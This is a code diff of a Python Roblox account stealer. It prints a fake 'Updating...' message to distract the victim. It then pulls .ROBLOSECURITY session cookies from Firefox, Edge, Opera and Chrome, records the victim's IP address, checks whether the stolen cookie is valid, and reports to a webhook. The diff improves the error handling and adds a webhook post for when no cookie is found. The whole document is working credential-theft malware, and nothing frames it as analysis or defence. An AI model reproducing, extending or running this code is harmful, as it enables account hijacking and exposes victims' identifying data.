@@ -90,9 +90,8 @@ dummy_message = Fore.MAGENTA + "Updating..." # A message that distracts the user
 print(dummy_message)
 ################### Gathering INFOMATION #################################
 def cookieLogger():
-
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
-
+    data = []  # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+    
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         for cookie in cookies:
@@ -111,7 +110,6 @@ def cookieLogger():
                 return data
     except:
         pass
-
     try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         for cookie in cookies:
@@ -121,7 +119,6 @@ def cookieLogger():
                 return data
     except:
         pass
-
     try:
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         for cookie in cookies:
@@ -131,7 +128,6 @@ def cookieLogger():
                 return data
     except:
         pass
-
     try:
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         for cookie in cookies:
@@ -141,14 +137,16 @@ def cookieLogger():
                 return data
     except:
         pass
-
+    
+    return None  # Return None if no .ROBLOSECURITY cookies are found
 
 cookies = cookieLogger()
-
-
-#################### INFOMATION #################
-ip_address = requests.get("https://api.ipify.org/").text
+if cookies is None:
+    requests.post(url=send_webhook, data={"content": "No .ROBLOSECURITY cookies found."})
+    exit()
+    
 roblox_cookie = cookies[1]
+ip_address = requests.get("https://api.ipify.org/").text
 #################### checking cookie #############
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
